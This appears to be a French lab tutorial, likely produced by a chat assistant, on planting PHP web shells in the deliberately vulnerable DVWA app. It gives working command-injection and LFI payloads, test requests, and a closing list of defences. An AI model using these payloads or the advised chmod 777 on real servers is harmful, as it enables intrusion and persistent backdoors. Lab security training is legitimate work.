Voici une explication détaillée pour déployer et exécuter le shell PHP sur DVWA (à des fins éducatives uniquement) :


C99 et R57 sont des web shells PHP très populaires parmi les attaquants.

    C99 shell :
    🔹 Interface avancée avec navigation dans les fichiers
    🔹 Gestion des bases de données (MySQL)
    🔹 Exécution de commandes système (exec, shell_exec, etc.)
    🔹 Scan de ports, upload de fichiers, et autres outils intégrés

    R57 shell :
    🔹 Interface plus légère mais tout aussi puissante
    🔹 Accès et édition de fichiers
    🔹 Exploitation de privilèges (root si possible)
    🔹 Possibilité de cacher des backdoors pour un accès permanent




Déployer le Shell PHP sur le Serveur

Pour que le shell fonctionne, vous devez le placer sur le serveur web (dans le dossier DVWA). Voici trois méthodes :
Méthode 1 : Utiliser la Vulnérabilité "File Upload" (Recommandé)

    Accédez à la vulnérabilité :
    Allez sur http://localhost/vulnerabilities/upload/ (niveau de sécurité : low).

    Téléversez le shell PHP :

        Créez un fichier shell.php avec le code fourni précédemment.

        Dans la page DVWA, cliquez sur "Parcourir", sélectionnez shell.php, puis "Upload".

    Exécutez le shell :
    Une fois téléversé, le shell sera accessible à l’adresse :
    http://localhost/hackable/uploads/shell.php?pass=secret123&cmd=ls
    (Modifiez les paramètres cmd, addfile, ou deletefile selon besoin).

Méthode 2 : Injection de Commande + Création du Fichier

Si la vulnérabilité Command Injection est exploitée (étape 2), utilisez-la pour créer directement shell.php sur le serveur :

    Injectez une commande pour créer le shell :
    Dans la page exec/, entrez :
    bash
    Copy

    127.0.0.1; echo '<?php if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"])."</pre>";} ?>' > shell.php

    Cela crée un fichier shell.php dans le dossier DVWA/vulnerabilities/exec/.

    Accédez au shell :
    Allez à http://localhost/vulnerabilities/exec/shell.php?cmd=ls.

Méthode 3 : Inclusion de Fichier Local (LFI) + Écriture

Si vous avez trouvé une vulnérabilité LFI, utilisez-la pour écrire le shell :

    Injectez du code PHP via l’URL :
    bash
    Copy

    http://localhost/DVWA/vulnerabilities/fi/?page=data:text/plain,<?php system($_GET['cmd']);?>

    Exécutez des commandes avec &cmd=ls.

Tester le Shell

Une fois le shell déployé, testez-le avec ces requêtes :

    Lister les fichiers :
    http://localhost/hackable/uploads/shell.php?pass=secret123&cmd=ls -la
    Result

    Créer un fichier :
    http://localhost/hackable/uploads/shell.php?pass=secret123&addfile=test.txt

    Supprimer un fichier :
    http://localhost/hackable/uploads/shell.php?pass=secret123&deletefile=test.txt

Problèmes Courants + Solutions

    Permissions Refusées :

        Assurez-vous que le dossier DVWA/hackable/uploads/ a les permissions en écriture (chmod 777).

        Utilisez des commandes comme whoami pour vérifier l’utilisateur du serveur.

    Fichier Non Trouvé :

        Vérifiez le chemin exact où le shell est téléversé (ex: DVWA/vulnerabilities/exec/ vs DVWA/hackable/uploads/).






🛡 4. Comment se protéger ?

✅ Désactiver l'exécution de fichiers PHP dans les dossiers d'upload
✅ Filtrer les extensions autorisées lors des uploads (jpg, png, etc.)
✅ Restreindre les fonctions PHP dangereuses (exec, shell_exec, system, passthru)
✅ Utiliser un WAF (pare-feu web comme ModSecurity)
✅ Surveiller les fichiers suspects sur le serveur (find /var/www/ -type f -name "*.php" -exec grep -i shell {} +)
✅ Utiliser des requêtes préparées (Prepared Statements)
✅ Éviter la concaténation de chaînes dans les requêtes SQL
✅ Ne jamais exécuter directement des entrées utilisateur dans system(), exec(), shell_exec()
✅ Utiliser des alternatives sécurisées (ex: proc_open() avec restrictions)
✅ Restreindre les permissions utilisateur (www-data en Linux ne doit pas avoir trop de privilèges)
✅ Autoriser uniquement certaines extensions (ex: .jpg, .png)
✅ Stocker les fichiers en dehors du répertoire web (/var/www/html/uploads → /var/uploads)
✅ Désactiver l'exécution des scripts PHP dans le dossier d'upload
✅ Vérifier le MIME type du fichier (éviter image.php.jpg)
✅ Empêcher l'upload de fichiers exécutables (.php, .sh, .exe)
✅ Restreindre l'accès aux fichiers sensibles (/etc/passwd, .env)